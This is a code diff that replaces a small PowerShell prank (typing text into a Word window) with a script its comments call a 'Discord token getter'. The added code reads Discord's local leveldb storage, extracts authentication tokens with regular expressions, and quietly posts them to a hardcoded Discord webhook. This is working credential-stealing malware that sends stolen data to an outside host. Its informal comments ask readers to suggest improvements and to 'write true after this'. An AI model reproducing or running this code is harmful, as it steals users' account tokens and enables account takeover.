@@ -1,5 +1,22 @@
-start winword
-$wshell = New-Object -ComObject wscript.shell;
-$wshell.AppActivate('specal - Word') 
-sleep 1 
-$wshell.SendKeys('{ENTER}Powershell is broken ')
+# If your reading this Hi you can look into my code now lul please send my improvments im not good in ps1
+# but i understand it because its more logic than x86 Asembly PLEASE write true after this
+# Input: 
+# No you dont have to!
+# FIRST LANGUAGE FROM IDK THATUSES # INSTEAD OF REM
+
+# START OF DISCORD TOKEN GETTER ONLY WORKS ON STANDALONE DONT HAVE ANYTHING OTHER TO TEST
+$webhook = "https://discord.com/api/webhooks/909577132949266452/aXYzmotuhDms3XKNvBe5AeIYKjr4mCzrk7DaQcWMf4LfXDnCUY7wF4c3d038Lh1QD8uE"
+$discordPath = $env:APPDATA+"\discord\Local Storage\leveldb"
+$possibleTokens = "";
+if( Test-Path -LiteralPath $discordPath){
+  Set-Location $discordPath
+  $files = @(Get-ChildItem *)
+  Foreach($f in $files) {
+    $mfa = Select-String -Path $f -Pattern "mfa\.[a-zA-Z0-9_-]{84}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value } # OLD 
+    if ($mfa.length -gt 1) {$possibleTokens += $mfa + "......................";}
+    $tkn = Select-String -Path $f -Pattern "[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }
+    if ($tkn.length -gt 2) {$possibleTokens += $tkn + "......................";}
+  }
+}
+
+$r = Invoke-WebRequest -Uri $webhook -Method POST -Body @{content=$possibleTokens} -UseBasicParsing -EV Err -EA SilentlyContinue
